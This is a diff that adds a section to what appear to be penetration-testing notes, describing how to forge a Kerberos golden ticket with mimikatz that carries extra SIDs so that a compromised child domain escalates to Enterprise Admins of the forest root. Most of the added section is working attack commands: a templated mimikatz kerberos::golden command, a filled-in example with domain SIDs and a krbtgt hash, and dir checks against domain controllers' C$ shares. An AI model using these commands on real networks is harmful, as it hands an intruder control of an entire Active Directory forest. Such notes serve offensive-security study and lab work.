@@ -75,3 +75,24 @@ Open up a new command prompt that leverages the golden ticket (must be in a GUI 
 ```powershell
 mimikatz: misc::cmd
 ```
+
+---
+
+## Trustpocalypse - Create and Use a Golden Ticket with `ExtraSids` Set to the SID of `Enterprise Admins` of the Forest Root Domain
+
+You'll need the [[golden-ticket#Required pieces of information|same items as normal for creating a golden ticket]]. In addition, you'll also need the SID of the `Enterprise Admins` group of the forest root domain.
+
+```powershell
+mimikatz: kerberos::golden /user:$USER_TO_IMPERSONATE /domain:$CHILD_DOMAIN_NAME /sid:$CHILD_DOMAIN_SID /krbtgt:$CHILD_DOMAIN_KRBTGT_NTLM /sids:$SID_OF_FOREST_ROOT_DOMAIN_ENTERPRISE_ADMINS_GROUP /id:$ID_OF_USER_TO_IMPERSONATE /ptt
+```
+
+- `$USER_TO_IMPERSONATE`: you probably want this to just be `Administrator`
+- `$ID_OF_USER_TO_IMPERSONATE`: you probably want this just to be `500` (the ID of the domain administrator)
+
+Example:
+
+```powershell
+kerberos::golden /user:Administrator /domain:dev.ADMIN.TGIHF.COM /sid:S-1-5-21-1416445593-394318334-2645530166 /krbtgt:9404def404bc198fd9830a3483869e78 /sids:S-1-5-21-1216317506-3509444512-4230741538-519 /id:500 /ptt
+```
+
+Test with `dir \\dc02.dev.ADMIN.TGIHF.COM\C$` or `dir \\dc03.ADMIN.TGIHF.COM\C$`.
